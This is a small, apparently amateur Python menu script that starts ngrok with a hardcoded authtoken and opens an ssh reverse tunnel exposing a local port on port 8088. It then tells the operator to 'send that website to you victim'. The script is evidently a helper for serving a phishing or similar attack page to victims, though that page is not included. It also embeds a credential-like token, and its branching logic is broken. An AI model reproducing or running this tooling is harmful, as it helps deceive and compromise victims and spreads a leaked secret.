import os 
from colorama import Fore 
import socketserver
import socket


#banner#
def menu():
     print (Fore.YELLOW + '  ▄█   █████████▄ ')          
     print (Fore.YELLOW + '  ██   ██      ██ ')                   
     print (Fore.YELLOW + '  ██   ██      ██ ')          
     print (Fore.YELLOW + '  ██   ██████████ ')                      
     print (Fore.YELLOW + '  ██   ██         ')                
     print (Fore.YELLOW + '  ██   ██         ')                                
     print (Fore.YELLOW + '  ██   ██         ')                    
     print (Fore.YELLOW + '  ██   ██         ')

     print ('opcions')
     print ("\t1 start")
     print ("\t2 install ngrok")
while True:
    
 menu()
   
 opcionMenu = input("select a opcion >>")

 if opcionMenu=="1":
     print ("starting ngrok")
     os.system("./ngrok authtoken 1otl8ouPfwH3JwCDCD4fxu2YCgq_624ab5GeqzJhPPwHUbauT")
     os.system("./ngrok ssh -R 8080:localhost:8088 remoteUser@IPAddress")
     print("if you see this message ./ngrok: not found,please install ngrok")
     print("Send that website to you victim and only wait ;)")
     input("\npress enter to back")
     os.system("clear")
     
 else:
     print("A problem was ocurred, ngrok was installed?")       
     os.system("clear")

 if opcionMenu=="2":
     print ("Installing ngrok...")
     os.system("sudo tar xvzf /tmp/mozilla_root0/ngrok-stable-linux-arm64.tgz -C /usr/local/bin")
     os.system("sudo tar xvzf /tmp/mozilla_osboxes0/ngrok-stable-linux-arm64.tgz -C /usr/local/bin")
     print ("if you see that message 'no souch file or directory',move the archive manualy")
     input("\npress enter to back")
     os.system("clear")
   
 else:
     print("an error was ocurred with the installation :c")
     os.system("clear")

